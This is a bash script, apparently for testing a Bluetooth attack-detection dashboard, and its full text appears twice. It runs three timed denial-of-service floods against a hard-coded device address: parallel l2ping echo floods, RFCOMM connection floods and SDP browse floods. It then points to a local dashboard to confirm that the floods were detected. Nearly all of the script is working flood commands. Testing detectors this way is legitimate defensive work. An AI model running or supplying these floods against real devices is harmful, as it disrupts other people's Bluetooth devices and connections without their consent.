#!/bin/bash
################################################################################
# RUN ALL 3 BLUETOOTH ATTACKS SEQUENTIALLY
# Total Duration: ~60 seconds
# Tests: L2PING, RFCOMM, SDP floods
################################################################################

TARGET="28:C6:3F:91:67:CE"

echo "================================================================================"
echo "🎯 BLUETOOTH ATTACK SUITE - MODULE 4 TESTING"
echo "================================================================================"
echo "Target: $TARGET"
echo "Total Duration: ~60 seconds"
echo "Attacks: 3 types (L2PING, RFCOMM, SDP)"
echo ""
echo "Dashboard: http://localhost:8000/module4"
echo "================================================================================"
echo ""
sleep 2

# Attack 1: L2PING Flood
echo "================================================================================"
echo "🔴 ATTACK 1/3: L2PING FLOOD"
echo "================================================================================"
echo "Method: L2CAP Echo Request flood"
echo "Processes: 5 l2ping threads"
echo "Duration: 15 seconds"
echo "================================================================================"

for i in {1..5}; do
    timeout 15 l2ping -i hci0 -s 600 -f $TARGET &>/dev/null &
done

echo "✅ Attack launched..."
sleep 15
pkill -9 l2ping
echo "✅ L2PING attack completed!"
echo ""
sleep 5

# Attack 2: RFCOMM Flood
echo "================================================================================"
echo "🟠 ATTACK 2/3: RFCOMM CONNECTION FLOOD"
echo "================================================================================"
echo "Method: RFCOMM connection attempts"
echo "Channels: 1-5"
echo "Duration: 15 seconds"
echo "================================================================================"

for i in {1..5}; do
    timeout 15 rfcomm connect 0 $TARGET $i &>/dev/null &
done

echo "✅ Attack launched..."
sleep 15
pkill -9 rfcomm
echo "✅ RFCOMM attack completed!"
echo ""
sleep 5

# Attack 3: SDP Flood
echo "================================================================================"
echo "🟡 ATTACK 3/3: SDP SERVICE DISCOVERY FLOOD"
echo "================================================================================"
echo "Method: SDP browse requests"
echo "Requests: 5 simultaneous"
echo "Duration: 15 seconds"
echo "================================================================================"

for i in {1..5}; do
    timeout 15 sdptool browse $TARGET &>/dev/null &
done

echo "✅ Attack launched..."
sleep 15
pkill -9 sdptool
echo "✅ SDP attack completed!"
echo ""

# Summary
echo "================================================================================"
echo "✅ ALL ATTACKS COMPLETED SUCCESSFULLY!"
echo "================================================================================"
echo ""
echo "📊 Attack Summary:"
echo "  🔴 L2PING Flood    : 15 seconds - COMPLETED"
echo "  🟠 RFCOMM Flood    : 15 seconds - COMPLETED"
echo "  🟡 SDP Flood       : 15 seconds - COMPLETED"
echo ""
echo "📱 View Results:"
echo "  Dashboard: http://localhost:8000/module4"
echo ""
echo "🔍 Verify Detection:"
echo "  - Attacks should appear on Module 4 page"
echo "  - Each attack displays for 20 seconds"
echo "  - Then moves to attack history"
echo ""
echo "================================================================================"












################################################################################
# RUN ALL 3 BLUETOOTH ATTACKS SEQUENTIALLY
# Total Duration: ~60 seconds
# Tests: L2PING, RFCOMM, SDP floods
################################################################################

TARGET="28:C6:3F:91:67:CE"

echo "================================================================================"
echo "🎯 BLUETOOTH ATTACK SUITE - MODULE 4 TESTING"
echo "================================================================================"
echo "Target: $TARGET"
echo "Total Duration: ~60 seconds"
echo "Attacks: 3 types (L2PING, RFCOMM, SDP)"
echo ""
echo "Dashboard: http://localhost:8000/module4"
echo "================================================================================"
echo ""
sleep 2

# Attack 1: L2PING Flood
echo "================================================================================"
echo "🔴 ATTACK 1/3: L2PING FLOOD"
echo "================================================================================"
echo "Method: L2CAP Echo Request flood"
echo "Processes: 5 l2ping threads"
echo "Duration: 15 seconds"
echo "================================================================================"

for i in {1..5}; do
    timeout 15 l2ping -i hci0 -s 600 -f $TARGET &>/dev/null &
done

echo "✅ Attack launched..."
sleep 15
pkill -9 l2ping
echo "✅ L2PING attack completed!"
echo ""
sleep 5

# Attack 2: RFCOMM Flood
echo "================================================================================"
echo "🟠 ATTACK 2/3: RFCOMM CONNECTION FLOOD"
echo "================================================================================"
echo "Method: RFCOMM connection attempts"
echo "Channels: 1-5"
echo "Duration: 15 seconds"
echo "================================================================================"

for i in {1..5}; do
    timeout 15 rfcomm connect 0 $TARGET $i &>/dev/null &
done

echo "✅ Attack launched..."
sleep 15
pkill -9 rfcomm
echo "✅ RFCOMM attack completed!"
echo ""
sleep 5

# Attack 3: SDP Flood
echo "================================================================================"
echo "🟡 ATTACK 3/3: SDP SERVICE DISCOVERY FLOOD"
echo "================================================================================"
echo "Method: SDP browse requests"
echo "Requests: 5 simultaneous"
echo "Duration: 15 seconds"
echo "================================================================================"

for i in {1..5}; do
    timeout 15 sdptool browse $TARGET &>/dev/null &
done

echo "✅ Attack launched..."
sleep 15
pkill -9 sdptool
echo "✅ SDP attack completed!"
echo ""

# Summary
echo "================================================================================"
echo "✅ ALL ATTACKS COMPLETED SUCCESSFULLY!"
echo "================================================================================"
echo ""
echo "📊 Attack Summary:"
echo "  🔴 L2PING Flood    : 15 seconds - COMPLETED"
echo "  🟠 RFCOMM Flood    : 15 seconds - COMPLETED"
echo "  🟡 SDP Flood       : 15 seconds - COMPLETED"
echo ""
echo "📱 View Results:"
echo "  Dashboard: http://localhost:8000/module4"
echo ""
echo "🔍 Verify Detection:"
echo "  - Attacks should appear on Module 4 page"
echo "  - Each attack displays for 20 seconds"
echo "  - Then moves to attack history"
echo ""
echo "================================================================================"














